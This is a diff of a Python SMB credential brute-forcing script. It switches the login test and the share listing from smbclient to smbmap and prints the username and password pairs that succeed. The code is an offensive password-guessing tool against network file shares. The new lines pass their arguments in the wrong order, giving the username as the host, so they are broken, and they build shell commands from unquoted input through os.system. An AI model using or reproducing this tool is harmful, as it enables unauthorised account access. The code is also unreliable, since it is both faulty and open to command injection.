@@ -49,7 +49,7 @@ def bruteforce(ip , username , password):
 			print("+=============================================================+")
 			print("+ TESTING  [\033[30;42m {} \033[m]   :   [\033[30;42m {} \033[m] " .format(u,p))
 			print("+=============================================================+")
-			if os.system("smbclient -L {} -U {}%{} 1> DUMP/scan.txt 2> DUMP/scan.txt".format(ip,u,p))==0:
+			if os.system("smbmap -H {} -u {} -p {} 1> DUMP/scan.txt 2> DUMP/scan.txt".format(u,p,ip))==0:
 				found.append("{}:{}".format(u,p))
 				
 	os.system("clear")
@@ -63,8 +63,8 @@ def bruteforce(ip , username , password):
 		for x in found:
 			u = x.split(":")[0]
 			p = x.split(":")[1]
-			print("[*] SHARES FOR USER : \033[30;42m {} \033[m  AND PASSWORD : \033[30;42m {} \033[m".format(u,p))
-			os.system("smbclient -L {} -U {}%{}".format(ip,u,p))
+			print("[*] SMB SHARE PERMISSIONS FOR USER : \033[30;42m {} \033[m  AND PASSWORD : \033[30;42m {} \033[m".format(u,p))
+			os.system("smbmap -H {} -u {} -p {}".format(u,p,ip))
 			print("+----------------------------------------------------------------------+")
 	
 	print("\n")
